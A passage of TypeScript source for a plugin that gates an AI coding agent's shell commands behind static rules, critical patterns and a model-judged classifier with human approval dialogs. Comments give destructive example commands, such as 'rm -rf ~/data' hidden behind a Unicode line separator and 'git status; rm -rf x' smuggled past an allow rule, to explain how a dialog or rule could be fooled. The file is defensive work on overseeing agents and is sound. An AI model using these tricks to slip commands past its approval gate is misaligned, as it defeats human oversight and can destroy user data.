/**
 * omp-classifier
 *
 * Adds a model-judged permission gate to the native `bash` tool. Commands not
 * already decided by a static deny/prompt/narrow-allow rule get classified;
 * anything risky raises a real permission request instead of executing
 * silently. Trivial commands still run with no plugin prompt.
 *
 * Scope: this gates the `bash` tool, and `eval` payloads that spawn a process
 * (issue #23, posture A). Expression-only eval code — compute, parse, format,
 * local reads — still auto-runs; spawn-bearing eval code classifies like a
 * bash command. `hub` (`op: "start"`) and any other exec-tier tool still
 * auto-run under `yolo`; the guarantees below cover bash and spawn-bearing
 * eval, not the session as a whole.
 *
 * Design:
 *   - `tool_call` interceptor, NOT tool shadowing. The native bash tool keeps
 *     its schema, description, approval declaration, and execution path; this
 *     plugin only sits in front of it. `tool_call` fires before the approval
 *     gate for model-issued calls, can block with a reason, and may await a
 *     human dialog (the runner pauses its handler budget across `ctx.ui`
 *     dialogs and fails closed on handler throw/timeout).
 *   - Native approval precedence is deny > CRITICAL > allow > prompt
 *     (tools/bash.ts:557-577), and a CRITICAL hit carries `override` with no
 *     policy, which `yolo` drops (tools/approval.ts:156-171). So a critical
 *     command auto-runs there even when a `prompt` or `allow` rule matches it.
 *     This plugin therefore checks critical patterns FIRST, in every approval
 *     mode, before honoring any allow/prompt rule.
 *       deny rule / user deny  -> native blocks it; plugin stays out.
 *       critical pattern       -> permission request, always, no model call.
 *       `prompt` pattern rule   -> native force-prompts; plugin stays out.
 *       narrow `allow` rule     -> a considered user decision; plugin stays out.
 *       blanket `*`/`**` allow  -> the "run everything" setting; classified.
 *       no pattern decision     -> classified in EVERY approval mode. The host's
 *                                  invisible per-session `autoApprove` can force
 *                                  yolo without appearing in settings, so mode
 *                                  reconstruction cannot safely skip this gate.
 *   - Anything that selects what actually executes is part of the identity of a
 *     judgement: command, native-resolved cwd, `env`, `pty`, timeout and async.
 *     A caller-supplied `env` (`PATH`, `BASH_ENV`, `LD_PRELOAD`, `GIT_PAGER`)
 *     is never classified — its values can hold secrets — it goes straight to a
 *     permission request.
 *   - Every gate decision appends one JSON line to
 *     <config root>/omp-classifier/decisions.jsonl (issue #33): tool,
 *     decision, layer, why, command, verdict, cache provenance, timing. The
 *     write is fire-and-forget: a failure drops the log line, never the
 *     command.
 *   - The plugin's own files — config, decisions.jsonl, status.json — resolve
 *     through the host's directory resolver, so a named profile,
 *     `PI_CONFIG_DIR` and an XDG-migrated config root each get their own file
 *     instead of every profile sharing `~/.omp/omp-classifier.json` (issue #9).
 *   - Settings are read through `pi.pi.settings` (the HOST module instance); a
 *     plugin-local `import { settings }` is a second, uninitialized copy that
 *     throws. An SDK/isolated session may have no global settings at all, so an
 *     unreadable read degrades to "no static rules, classify everything" rather
 *     than blocking every bash call.
 *   - Classification asks the judgment module's judge (TypeSafe's Jev /
 *     System One, with the harness's tiny/smol chain behind it as fallback)
 *     exactly one request per command: a fixed battery of typed questions (one
 *     Choice for the verdict, one Noul per hazard, one Score for blast radius)
 *     whose returned probabilities code derives a verdict from (see jev.ts).
 *     Transport, credentials (AuthStorage), retries, and model choice
 *     (`TYPESAFE_DEFAULT_MODEL` else `jev-latest`) hence belong to the host —
 *     the plugin passes a deadline and receives a probability vector, and
 *     every deterministic check that surrounded the old judge (static rules,
 *     moderate-risk tokens, the eval spawn scan, forced dialogs, grants,
 *     refusal memory) is unchanged. Which transport answers is one seam
 *     (`JudgeBackend`, issue #84): the default is that host path, and the
 *     `judgeBackend` config key can point the gate at any server speaking the
 *     same System One contract (`POST {state, model, questions}`) with its
 *     credential in a named environment variable. The backend's id joins the
 *     config signature and the cache key, so a verdict is only ever served
 *     under the judge that produced it.
 *
 * Fail-closed points: a command too long to display is blocked outright; an
 * `env` override and a judgment that fails, times out, or answers with a
 * shape we cannot read raise a permission request when a UI exists and block
 * when headless; any unexpected plugin throw always blocks. A command the gate
 * could not judge is never silently auto-run. A SAFE verdict alone is never
 * enough to auto-run a command carrying a destructive/irreversible token
 * (matchModerateRiskTokens): those raise a permission request even when the
 * judge said SAFE.
 */
import * as fs from "node:fs";
import { createHash } from "node:crypto";
import * as os from "node:os";
import * as path from "node:path";
import type { ExtensionAPI, ExtensionContext } from "@oh-my-pi/pi-coding-agent";
import type { ToolCallEvent } from "@oh-my-pi/pi-coding-agent";
import { CRITICAL_BASH_PATTERNS } from "@oh-my-pi/pi-coding-agent/tools/bash";
import { resolveToCwd } from "@oh-my-pi/pi-coding-agent/tools/path-utils";
import { extractLeadingCdTarget, tokenizeShellSegments } from "@oh-my-pi/pi-coding-agent/tools/shell-tokenize";
import { getPluginsDir, getPluginsLockfile } from "@oh-my-pi/pi-utils";
import { evaluateFloor, type FloorEntry } from "./floor";
import { heredocShadowedAt, maskHeredocBodiesAndAnsiSpans, openQuoteBefore, segmentWorkingDirectories, SHELL_WORD_EXPANSION } from "./shell-cwd";
import { parseShell, substitutionSpans, type ShellCommand, type ShellRedirect } from "./shell-ast";
import {
	DEFAULT_JUDGE_BACKEND,
	judgeBackendFor,
	judgeBatteryUnderDeadline,
	judgeJevV3,
	parseJudgeBackend,
	type JudgeBackendConfig,
} from "./jev-judge";
import { buildAuthorizationState, DEFAULT_AUTHORIZATION_POLICY, deriveAuthorization, summarizeActions, type ActionSummaryEntry, type JevAuthorizationLevel } from "./authorization";
import { deriveDecisionOrder, type DecisionBranch } from "./decision-order";
import { literalMatch } from "./literal-match";
import { redactSecrets, redactValue } from "./redact";
import {
	buildJevState,
	DEFAULT_JEV_POLICY,
	deriveJevDecision,
	JEV_POLICY_VERSION,
	jevQuestionsHash,
	type GitPushProvenance,
	type GitRefProvenance,
	type GitWorktreeProvenance,
	type JevHazard,
	type JevPolicy,
	type JevAnswers,
	type JevVerdict,
	type NetworkProvenance,
	measureGitPushProvenance,
	measureGitRefProvenance,
	measureGitWorktreeProvenance,
	measureNetworkProvenance,
} from "./jev";

type Verdict = "SAFE" | "UNSAFE" | "UNSURE" | "UNAVAILABLE";

/**
 * What the jev-v3 judgment decided in shadow for one fresh classification
 * (plan Phase 2 step 8). Labels and numbers only, never message text. It is
 * logged beside the live verdict and read by no decision until the flip.
 */
export type ShadowV3 = (
	| {
			verdict: JevVerdict;
			branch: DecisionBranch;
			reasonCode: string;
			authorization: JevAuthorizationLevel;
			namedFirm: boolean;
			/** null on the eval path, which has no shell to match. */
			literalMatched: boolean | null;
			overlay: string[];
			ms: number;
			/** Why the authorization request failed; the level then reads `none`. */
			authorizationError?: string;
	  }
	| { error: string; ms: number }
) & {
	/** The live jev-v2 verdict this shadow ran beside. A dialog line carries
	 *  no verdict of its own, so this is how a report tells a denied dialog
	 *  that followed a real verdict from one that followed an outage. */
	live?: JevVerdict;
};

/** A judgment whose deadline fired while its request was still running (issue
 *  #62). The verdict the request eventually produces can refine the dialog the
 *  deadline opened — and only that: it cannot bypass a dialog, and a late
 *  UNSAFE never re-blocks a command a human already allowed. `cancel` is what
 *  the human's own answer calls: nobody is listening any more. */
interface LateJudgement {
	/** The late verdict, or undefined when the request was cancelled or the
	 *  listen window closed. Never rejects. */
	answer: Promise<Judgement | undefined>;
	cancel(): void;
}

/** The timed-out judgment offered to a dialog, WITH the guards a late SAFE
 *  still has to answer for (issue #62). One object on purpose: the guards are
 *  not optional context, and a caller that handed the dialog a bare handle
 *  would be letting a late SAFE auto-run a command the verdict path would have
 *  asked about. The late path recovers the answer the deadline took away; it
 *  never skips a guard the on-time path applies. */
interface GuardedLateJudgement {
	/** The still-running judgment. */
	handle: LateJudgement;
	/** The refusal this session already holds for this exact target, which rode
	 *  into the judge state as `priorRefusal`. A SAFE on a refused target still
	 *  asks, because a refusal is a human's (or a critical pattern's) stop. */
	priorRefusal: Refusal | undefined;
	/** The deterministic risk overlay for this command
	 *  (`matchModerateRiskTokens`, `evalRiskFlags`): a SAFE on a command
	 *  carrying a destructive token still asks. */
	riskFlags: readonly string[];
}

interface Judgement {
	verdict: Verdict;
	reason: string;
	/** Structured risk bucket used by replay/measurement consumers. Derived
	 *  from the Jev decision and the deterministic overlays, for telemetry;
	 *  the gate itself never trusts it as authority. */
	risk?: "routine" | "review" | "irreversible" | "unavailable";
	/** Whether this decision depended on user authorization evidence. */
	authorization?: "not-required" | "grounded" | "missing" | "conflicted";
	/** Stable machine reason for telemetry; `reason` remains human-readable. */
	reasonCode?: string;
	/** Model that answered, when an answer existed (`jev-1.13.0`). */
	modelId?: string;
	/**
	 * Jev telemetry for this decision, taken verbatim from the response: the
	 * probability vector and confidence the verdict was derived from, the
	 * hazard nouls, the blast-radius score, token usage, and measured latency.
	 * Kept because Jev returns no prose of its own — without this, a dialog or
	 * an audit line would have nothing to show about why a verdict landed
	 * where it did.
	 */
	jev?: {
		model: string;
		probabilities: Record<string, number>;
		hazards: Partial<Record<JevHazard, number>>;
		confidence: number;
		blastRadius: number;
		usage?: { input_tokens?: number; output_tokens?: number };
		latencyMs: number;
	};
	/**
	 * Set when the verdict is UNAVAILABLE for a transport or answer-shape
	 * failure: dialog, never cached, so one failed request cannot pin the
	 * session to a stale non-answer.
	 */
	noCache?: boolean;
	/** False when an UNSAFE must not be written to refusal memory (a one-hot
	 *  keyword answer, jev-v2.1). Absent means true. */
	persistRefusal?: boolean;
	/** The jev-v3 shadow for this classification, when it ran. */
	v3?: ShadowV3;
	/** Present only when the deadline fired and the request is still running
	 *  (issue #62): the timed-out judgment, whose late answer may dismiss or
	 *  refine the dialog the deadline opened. Never cached — UNAVAILABLE sets
	 *  `noCache` — so a handle with live promises never outlives its call. */
	late?: LateJudgement;
}

/** A cached judgement minus its shadow. The shadow ran for the call that
 *  filled the cache; carried onto a later call's dialog line it would read as
 *  a fresh shadow result for a call that asked nothing. */
function withoutShadow(judgement: Judgement): Judgement {
	const { v3: _shadow, ...rest } = judgement;
	return rest;
}

/** The judgement fields every decision line carries once a judgement exists.
 *  One helper, so no log site can carry the authorization label and drop the
 *  shadow, or the other way round. */
function judgementAudit(judgement: Judgement): Pick<DecisionRecord, "authorization" | "v3"> {
	return {
		...(judgement.authorization ? { authorization: judgement.authorization } : {}),
		...(judgement.v3 ? { v3: judgement.v3 } : {}),
	};
}

/** Per-session cache: sessionId -> `${cwd}\0${env}\0${pty}\0${command}` -> judgement. */
const cache = new Map<string, Map<string, Judgement>>();
// Effective-config signature of the last gate run. The classifier config
// (enabled, the derived judge-model identity, timeoutMs, maxCommandLength,
// evidenceUserMessages, and the merged Jev policy) is the trust state a cached
// verdict was made under: changing any of it invalidates every session's
// cached judgements, so a model swap or a `jevPolicy` edit cannot reuse a SAFE
// verdict made by (or under the policy of) a different configuration.
let classifierConfigSignature = "";

// Stale-code guard: OMP binds plugin code at session start, so a fix landing
// mid-session stays invisible to running sessions — the exact multi-day
// confusion behind the pre-carve-out egress dialogs of Sep 9-10. The load
// mtime is captured once at module load (= session start); dialogs and
// blocks pay one stat to flag a session whose on-disk plugin is newer.
const PLUGIN_FILE = new URL(import.meta.url).pathname;
const PLUGIN_LOAD_MTIME = fs.statSync(PLUGIN_FILE, { throwIfNoEntry: false })?.mtimeMs ?? 0;
export const STALE_CODE_SUFFIX = " (plugin code changed since session start; restart to pick up fixes)";

/**
 * The dialog subtitle suffix for a session whose plugin file changed on disk
 * since it loaded. Exported as the test seam for the mtime comparison.
 */
export function pluginStaleSuffix(loadedMtimeMs: number, onDiskMtimeMs: number | undefined): string {
	return onDiskMtimeMs !== undefined && onDiskMtimeMs > loadedMtimeMs ? STALE_CODE_SUFFIX : "";
}

/** Sessions already told that the host lockfile disabled us after we bound.
 *  Per session, so one warning per session and not one per bash call. */
const staleDisableWarned = new Set<string>();
const CACHE_CAP = 500;

/** Per-session refusal memory (issue #30): sessionId -> refusals, oldest first. */
interface Refusal {
	normalizedTarget: string;
	why: string;
	ts: number;
	/** Refusals are not interchangeable: a model judgment is revisitable when
	 *  the reviewed context changes, while a human denial remains a deliberate
	 *  stop until the user explicitly approves. */
	source: "human" | "model" | "critical" | "cap";
	/** A refusal only applies to the directory whose effects were reviewed. */
	cwd: string;
	/** Evidence context at the time of a model judgment. */
	evidenceFingerprint?: string;
}
const refusals = new Map<string, Refusal[]>();
const REFUSAL_CAP = 20;

/** Per-session grants (issue #32): sessionId -> grants, oldest first. A grant
 *  records a user's "Allow for session" answer: this command's normalized
 *  target, in this exact directory, may run without further gating until the
 *  session ends. Config changes clear every store (re-arms the gate). */
interface Grant {
	normalizedTarget: string;
	cwd: string;
	/** The session's own directory at approval time, for the targets that can
	 *  act in a second directory of their own (eval, issue #14): `cwd` above is
	 *  the payload's spawn directory then, and this is where the payload's own
	 *  process runs, reads and writes. The judge's cache key carries both
	 *  directories for exactly that reason — a verdict earned under one pair
	 *  must not be reused under another — and the grant is the same
	 *  authorization over the same pair, so it carries both too. Absent for
	 *  bash, whose one directory is `cwd` already (the host runs the whole
	 *  command there). */
	scopeCwd?: string;
	ts: number;
	/** User scope at approval time. A later restriction/revocation invalidates
	 *  the grant, while ordinary tool evidence remains non-authorizing. */
	evidenceFingerprint?: string;
}
const grants = new Map<string, Grant[]>();
const GRANT_CAP = 50;

/** Per-session taint for the code floor (plan Phase 2 step 1): the variables
 *  a command in this session captured a secret into, so a later `echo $KEY`
 *  is recognized as a secret reaching the transcript. Shadow state — the
 *  floor is computed and logged, and decides nothing until the `jev-v3`
 *  flip — and wiped at the same session boundaries as the other stores. */
const floorTaint = new Map<string, string[]>();
const FLOOR_TAINT_CAP = 50;

/** Per-session classifier pause (issue #48): `/classifier off` adds the
 *  sessionId here. Same semantics as `config.enabled=false` scoped to one
 *  session — model classification skips, critical/env/static-rule checks stay
 *  on — but NOT part of classifierConfigSignature: pausing changes no trust
 *  state, so cached verdicts stay valid and a resume serves them again.
 *  Wiped at session boundaries like cache/refusals/grants. */
const sessionOff = new Set<string>();

/** Dry-run capture (issue #32): `/classifier dry-run <command>` sets this,
 *  fires the real tool_call handler once, and reads back what it recorded.
 *  While set, the gate's decision choke points record the FIRST decision they
 *  reach instead of acting on it — no decisions.jsonl write, no refusal or
 *  grant store mutation, no cache write, no model call, no dialog — and
 *  dry-run clears the variable in a finally. Module-level on purpose: the
 *  alternative threads a flag through every hot-path decision site. The race
 *  window (a real bash call interleaving with a probe on the shared module
 *  state) is acceptable for a single-user interactive host; every probe-path
 *  early return is a fail-closed block, so a racing live call can lose its
 *  cache write or get spuriously blocked, but never silently allowed. */
interface DryRunResult {
	would: "allow" | "block" | "classify";
	layer: string;
	why: string;
	note?: string;
}
let dryRun: { result: DryRunResult | undefined } | null = null;

/** First decision wins: later decision points in the same probe are ignored,
 *  so the reported layer is the one that actually decided. */
function recordDryRunResult(entry: DryRunResult): void {
	if (dryRun && dryRun.result === undefined) dryRun.result = entry;
}
/**
 * Classifier timeout is config-driven. Default 8s: one Jev request is a
 * single round trip with no generation step — measured 0.6s for the full
 * six-question battery over a 528-token state, most of it server-side — so 8s
 * is more than ten times the measured cost and still short enough that a dead
 * endpoint fails closed while the operator is still looking at the prompt.
 * The old 25s default existed because a reasoning judge had to think and then
 * write an analysis; nothing in this path does either.
 * Budget math: the runner's tool_call handler bounds this whole path at 30s
 * (extensionHandlers.toolCallTimeoutMs) and a timeout fails closed, so the
 * default leaves the entire handler budget as slack. A larger timeoutMs is
 * legal (up to ~28s, past which the host budget bites first) but buys patience
 * on a slow network, never a better verdict. `/classifier` dialogs pause the
 * handler budget, so a human is never on this clock.
 */
const DEFAULT_TIMEOUT_MS = 8_000;
const DEFAULT_MAX_COMMAND_LENGTH = 8_000;
/** Stable policy identity for decision replay and rollout telemetry. Bump when
 *  classifier semantics change independently of the host/plugin version. This
 *  tracks jev.ts's own version on purpose: the battery and the derivation
 *  rules move together, so a second identity here could only hide a
 *  half-landed change. CLASSIFIER_POLICY_HASH carries the question text. */
export const CLASSIFIER_POLICY_VERSION = JEV_POLICY_VERSION;
type BashPatternApproval = "allow" | "deny" | "prompt";

interface BashApprovalPatternRule {
	match: string;
	approval: BashPatternApproval;
}

// ---------------------------------------------------------------------------
// Static rule matching — mirrored from the builtin (tools/bash.ts:213-296).
// The plugin must read `bash.patterns` exactly as native bash does, or it would
// classify (and prompt for) commands the user already decided about.
// ---------------------------------------------------------------------------

/**
 * Characters that must never reach the dialog raw.
 *
 * C0 and DEL: the old body ran the command through JSON.stringify, which
 * incidentally escaped these; rendering raw does not. `\x1b[2J\x1b[H`, an SGR
 * run, or a bare carriage return can repaint or overwrite the approval dialog
 * while the command still executes in full.
 *
 * U+0085, U+2028, U+2029: the Markdown lexer treats these as line breaks but
 * `verbatim` split on "\n" only, so a command containing one escaped the code
 * block. The half before it disappeared from the token stream entirely and the
 * half after rendered as live Markdown. `rm -rf ~/data\u2028git status` showed
 * the user `git status` and ran the deletion. Not a regression (JSON.stringify
 * left them raw too) but this is where the helper and its invariant live.
 *
 * C1 (U+0080-U+009F): the 8-bit forms of the same escapes. U+009B IS a CSI, so
 * a raw U+009B followed by `2J` repaints the dialog on any terminal honoring
 * 8-bit C1 in UTF-8, which is xterm's default. Escaping ESC alone leaves that
 * open, which is why the class covers the whole range rather than U+0085 only.
 *
 * Bidi overrides and zero-width characters: pi-tui does not strip them, so an
 * RLO can display a command in an order it does not execute in. U+061C is the
 * Arabic-letter-mark sibling of the U+200E/200F pair.
 */
const DIALOG_UNSAFE_CHARS =
	/[\u0000-\u0009\u000B-\u001F\u007F-\u009F\u061C\u200B-\u200F\u202A-\u202E\u2028\u2029\u2060-\u2064\u2066-\u2069\uFEFF]/gu;

/**
 * The backslash is escaped FIRST, or the encoding is not injective: a command
 * carrying the four literal characters \x1b and one carrying a real ESC
 * rendered identically, so the dialog could not tell the reader which of the
 * two they were approving, and copying the displayed text got them a
 * different command than the one that executes.
 *
 * U+0009 joins the class because the Markdown renderer EXPANDS tabs, so a
 * command using them displayed as spaces and was not the command that runs.
 * Tabs are load-bearing in the constructs worth reviewing: a <<-EOF body
 * strips leading tabs and not spaces, and IFS, awk field separators and
 * Makefile recipe lines all depend on them.
 */
function escapeControlChars(text: string): string {
	return text.replace(/\\/gu, "\\\\").replace(DIALOG_UNSAFE_CHARS, ch => {
		const code = ch.codePointAt(0) ?? 0;
		return code > 0xff
			? `\\u${code.toString(16).padStart(4, "0")}`
			: `\\x${code.toString(16).padStart(2, "0")}`;
	});
}

/** Four-space indent, so Markdown renders the span verbatim. */
function verbatim(text: string): string {
	return escapeControlChars(text)
		.split("\n")
		.map(line => `    ${line}`)
		.join("\n");
}

/** Trailing-slash-insensitive directory comparison. Root stays "/". */
function samePath(a: string, b: string | undefined): boolean {
	// No .trim(): "/workspace " is a real and different directory on macOS and
	// Linux, and trimming it made the dialog imply the command runs in the
	// session cwd when it does not. Trailing-slash insensitivity only.
	const strip = (value: string | undefined): string => {
		if (!value) return "";
		if (value.length > 1 && value.endsWith("/")) return value.slice(0, -1);
		return value;
	};
	return strip(a) === strip(b);
}

function normalizeBashApprovalPattern(value: string): string {
	return value.trim().replace(/\s+/gu, " ");
}

function bashApprovalPatternToRegExp(pattern: string): RegExp {
	const escaped = normalizeBashApprovalPattern(pattern)
		.split("*")
		.map(part => part.replace(/[\\^$+?.()|[\]{}]/gu, "\\$&"))
		.join(".*");
	return new RegExp(`^${escaped}$`, "u");
}

const BASH_APPROVAL_SHELL_CONTROL_CHARS: Record<string, true> = {
	"\n": true,
	"\r": true,
	";": true,
	"&": true,
	"|": true,
	"<": true,
	">": true,
	"`": true,
	$: true,
	"(": true,
	")": true,
};
const BASH_APPROVAL_REINTERPRETED_ARGUMENT_RE = /(?:^|[ \t])(?:-[^-]*[ce]|--(?:command|eval))(?:[= \t]|$)/u;

/** Mirror of the native allow-rule guard (tools/bash.ts:76-127). */
function hasBashApprovalShellControl(command: string): boolean {
	let quote: "'" | '"' | undefined;
	let hasReinterpretableShellControl = false;
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		if (quote === "'") {
			if (ch === "'") {
				quote = undefined;
			} else if (Object.hasOwn(BASH_APPROVAL_SHELL_CONTROL_CHARS, ch)) {
				hasReinterpretableShellControl = true;
			}
			continue;
		}
		if (ch === "\\") {
			const escaped = command[i + 1];
			if (escaped && Object.hasOwn(BASH_APPROVAL_SHELL_CONTROL_CHARS, escaped)) {
				hasReinterpretableShellControl = true;
			}
			i++;
			continue;
		}
		if (quote === '"') {
			if (ch === '"') {
				quote = undefined;
				continue;
			}
			// Expansion is active inside double quotes even in the original line.
			if (ch === "`" || ch === "$") return true;
			// Other control characters are literal here but become executable if a
			// `-c`/`-e` option reinterprets the argument through another shell.
			if (Object.hasOwn(BASH_APPROVAL_SHELL_CONTROL_CHARS, ch)) hasReinterpretableShellControl = true;
			continue;
		}
		if (ch === "'" || ch === '"') {
			quote = ch;
			continue;
		}
		if (Object.hasOwn(BASH_APPROVAL_SHELL_CONTROL_CHARS, ch)) return true;
	}
	return hasReinterpretableShellControl && BASH_APPROVAL_REINTERPRETED_ARGUMENT_RE.test(command);
}

function commandMatchesBashApprovalPattern(command: string, pattern: string): boolean {
	const normalizedCommand = normalizeBashApprovalPattern(command);
	if (normalizedCommand.length === 0) return false;
	return bashApprovalPatternToRegExp(pattern).test(normalizedCommand);
}

// Same tokenizer as the native gate (tools/bash.ts:264) so `deny`/`prompt`
// rules see identical segmentation to the builtin.
function bashCommandSegments(command: string): string[] {
	return tokenizeShellSegments(command)
		.map(segment => segment.join(" "))
		.filter(segment => segment.length > 0);
}

function commandSegmentMatchesBashApprovalPattern(command: string, pattern: string): boolean {
	const regex = bashApprovalPatternToRegExp(pattern);
	const normalizedCommand = normalizeBashApprovalPattern(command);
	if (normalizedCommand.length === 0) return false;
	if (regex.test(normalizedCommand)) return true;
	return bashCommandSegments(command).some(segment => regex.test(segment));
}

function bashApprovalRuleMatches(command: string, rule: BashApprovalPatternRule): boolean {
	if (rule.approval === "allow") {
		// `allow` must vouch for the ENTIRE command; shell control syntax can
		// smuggle a second command past a narrow allow (`git status; rm -rf x`).
		if (hasBashApprovalShellControl(command)) return false;
		return commandMatchesBashApprovalPattern(command, rule.match);
	}
	return commandSegmentMatchesBashApprovalPattern(command, rule.match);
}

function normalizeBashPatternApproval(value: unknown): BashPatternApproval | undefined {
	if (typeof value !== "string") return undefined;
	const normalized = value.trim().toLowerCase();
	return normalized === "allow" || normalized === "deny" || normalized === "prompt" ? normalized : undefined;
}

function parseBashApprovalPatternRules(value: unknown): BashApprovalPatternRule[] {
	if (!Array.isArray(value)) return [];
	return value
		.map(item => {
			if (!item || typeof item !== "object" || Array.isArray(item)) return undefined;
			const record = item as Record<string, unknown>;
			if (typeof record.match !== "string") return undefined;
			const match = normalizeBashApprovalPattern(record.match);
			const approval = normalizeBashPatternApproval(record.approval);
			return match.length > 0 && approval ? { match, approval } : undefined;
		})
		.filter((rule): rule is BashApprovalPatternRule => !!rule);
}

/**
 * A `*`-only pattern (`*`, `**`, `* *`) compiles to a match-everything regex in
 * `bashApprovalPatternToRegExp`, so breadth — not spelling — decides whether an
 * `allow` rule is a considered decision about one command shape or a blanket
 * "run everything". Comparing the text to `"*"` let `**` disable this plugin.
 */
function isBlanketPattern(match: string): boolean {
	return match.replace(/[*\s]/gu, "").length === 0;
}

/** Mirror of the native user-policy normalizer (tools/approval.ts:46-49). */
function normalizeUserPolicy(value: unknown): "allow" | "deny" | "prompt" | undefined {
	if (typeof value !== "string") return undefined;
	const lowered = value.trim().toLowerCase();
	return lowered === "allow" || lowered === "deny" || lowered === "prompt" ? lowered : undefined;
}

interface CanonicalEnv {
	key: string;
	keys: string[];
}

/**
 * Canonical form of the `env` override for cache keying: same pairs in a
 * different insertion order must produce the same key, and any difference at
 * all must produce a different one. JSON encoding is injective for string
 * pairs; a delimiter join let control characters in a value forge a second
 * pair. `env` selects which program actually runs (`PATH`, `BASH_ENV`,
 * `LD_PRELOAD`, `GIT_PAGER`), so a verdict earned without it can never be
 * reused with it.
 */
function canonicalEnv(value: unknown): CanonicalEnv {
	if (!value || typeof value !== "object" || Array.isArray(value)) return { key: "", keys: [] };
	const entries = Object.entries(value as Record<string, unknown>)
		.filter((entry): entry is [string, string] => typeof entry[1] === "string")
		.sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0));
	return { key: JSON.stringify(entries), keys: entries.map(([key]) => key) };
}

// ---------------------------------------------------------------------------
// Classifier
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Plugin config
//
// OMP's /settings renders only the host's compiled settings schema; there is no
// extension hook to add keys, so the classifier keeps its own small config
// file. `OMP_JEV_CONFIG` overrides the path (used by tests).
// ---------------------------------------------------------------------------

interface ClassifierConfig {
	enabled: boolean;
	/**
	 * Model the judge will answer with — a derived read-only identity, never a
	 * knob. The native judge resolves its own TypeSafe client from
	 * `TYPESAFE_DEFAULT_MODEL` (host default `jev-latest`, resolved server-side
	 * to the current release), and can additionally fall back to the chat
	 * judge, so the id that actually answers is read back off the response as
	 * `Judgement.modelId`. This field mirrors the host's pre-call resolution
	 * for two consumers only: `/classifier` display and the cache trust state —
	 * a model swap must still invalidate cached verdicts. A `typesafeModel`
	 * key in a pre-existing config file is tolerated and ignored.
	 */
	typesafeModel: string;
	/**
	 * Which transport answers the battery (issue #84). `{kind: "typesafe"}` —
	 * the default — is the host's judge resolution, unchanged; `{kind:
	 * "endpoint", baseUrl, model, apiKeyEnv}` points the gate at any server
	 * speaking the System One wire contract, with the credential read from the
	 * named environment variable (a name, never the key itself: a key pasted
	 * here is looked up as a variable and fails closed).
	 *
	 * Part of the config signature and of every cache key, as `typesafeModel` is:
	 * a verdict earned from one judge must never be served under another. It is
	 * file-only — no `/classifier` setter — because a nested object has no
	 * round-trip through one command argument; `/classifier reset` returns it to
	 * the default.
	 */
	judgeBackend: JudgeBackendConfig;
	/** Threshold overrides over DEFAULT_JEV_POLICY; absent keys keep the
	 *  shipped default. These are policy, not facts from vendor docs: measured
	 *  Jev probabilities move with the question set and the state shape (the
	 *  same command scored p(safe) 0.61 alone and 0.52 with the full battery
	 *  plus structured state), so the floors here are the operator's dials.
	 *  `/classifier policy` prints the merged result. */
	jevPolicy: Partial<JevPolicy>;
	timeoutMs: number;
	maxCommandLength: number;
	/** Issue #31: how many recent user messages ride into the record as
	 *  `evidence.userMessages`. 0 sends no evidence at all. */
	evidenceUserMessages: number;
	/** Persistent "Always allow" grants (bash only): the dialog's Always
	 *  option writes `{cmd, cwd}` to a JSON store at the config root, and a
	 *  live entry lets that EXACT command text run in that directory across
	 *  sessions (30-day TTL). Kill-switch only — a cached verdict's trust
	 *  state never depends on it, so unlike enabled/typesafeModel/jevPolicy/
	 *  timeoutMs/maxCommandLength/evidenceUserMessages this key is
	 *  deliberately NOT part of classifierConfigSignature: flipping it must
	 *  not invalidate caches. */
	persistentGrants: boolean;
	/** Run the jev-v3 judgment in shadow beside the live one (plan Phase 2
	 *  step 8) and log it on the same decision line. It costs two more Jev
	 *  requests per fresh classification and decides nothing, so, like
	 *  persistentGrants, it stays out of classifierConfigSignature: flipping it
	 *  changes no cached verdict. */
	shadowV3: boolean;
}

/** Bounds for the `maxCommandLength` config key and the `/classifier` setter. */
const MIN_COMMAND_LENGTH = 64;
const MAX_COMMAND_LENGTH_CEILING = 100_000;

/** Bounds for the `evidenceUserMessages` config key and the `/classifier` setter. */
const MIN_EVIDENCE_USER_MESSAGES = 0;
const MAX_EVIDENCE_USER_MESSAGES = 6;

/**
 * The `jevPolicy` keys a config file may override, with the range each must
 * land in. A hand-edited value of the wrong type, an unknown key, a NaN, or an
 * out-of-range number is DROPPED, never passed through: these numbers decide
 * auto-run, so a typo has to mean "keep the default", never "no floor". The
 * ranges are the shapes' own (probabilities are 0..1; the blast-radius score is
 * a level index in the battery's legend), not a claim about good thresholds.
 */
const JEV_POLICY_RANGES: Record<keyof JevPolicy, { min: number; max: number }> = {
	safeMinProbability: { min: 0, max: 1 },
	safeMinConfidence: { min: 0, max: 1 },
	unsafeMinProbability: { min: 0, max: 1 },
	hazardBlock: { min: 0, max: 1 },
	hazardReview: { min: 0, max: 1 },
	blastRadiusReview: { min: 0, max: 10 },
};

/** Defaults without `typesafeModel`: the model identity is derived per read in
 *  normalizeClassifierConfig — the single derivation site — so no module-load
 *  snapshot can go stale when `TYPESAFE_DEFAULT_MODEL` changes. */
const CLASSIFIER_CONFIG_DEFAULTS: Omit<ClassifierConfig, "typesafeModel"> = {
	enabled: true,
	judgeBackend: DEFAULT_JUDGE_BACKEND,
	jevPolicy: {},
	timeoutMs: DEFAULT_TIMEOUT_MS,
	maxCommandLength: DEFAULT_MAX_COMMAND_LENGTH,
	evidenceUserMessages: 3,
	persistentGrants: true,
	shadowV3: true,
};

/** The effective policy: shipped defaults with the operator's overrides applied.
 *  Every decision and the config signature read the policy through this, so a
 *  partial `jevPolicy` can never leave a floor accidentally unset. */
export function jevPolicyFor(config: ClassifierConfig): JevPolicy {
	return { ...DEFAULT_JEV_POLICY, ...config.jevPolicy };
}

/**
 * The config root the host places a plugin's own file in (issue #9).
 *
 * `getConfigRootDir()` answers the profile and `PI_CONFIG_DIR` halves of the
 * question but not the XDG half: the host resolves a top-level file at the
 * config root through its `data` category (`getMarketplacesRegistryPath()`,
 * `getAutoQaDbPath()`), which redirects to `$XDG_DATA_HOME/omp` on darwin/linux
 * once the user has migrated. `dirname(getPluginsDir())` is the exported handle
 * on that same base — `getPluginsDir()` is `rootSubdir("plugins", "data")` — so
 * every directory input (profile, `PI_CONFIG_DIR`, XDG) is answered by the
 * host's resolver instead of being re-derived from `process.env` here. With no
 * XDG migration the two bases are identical, so no existing file moves.
 */
function pluginRootDir(): string {
	return path.dirname(getPluginsDir());
}

/** Exported as a test seam (issue #9): the resolution is only observable in a
 *  process that started with the environment under test, so the regression
 *  test spawns one and asks for this path. */
export function classifierConfigPath(): string {
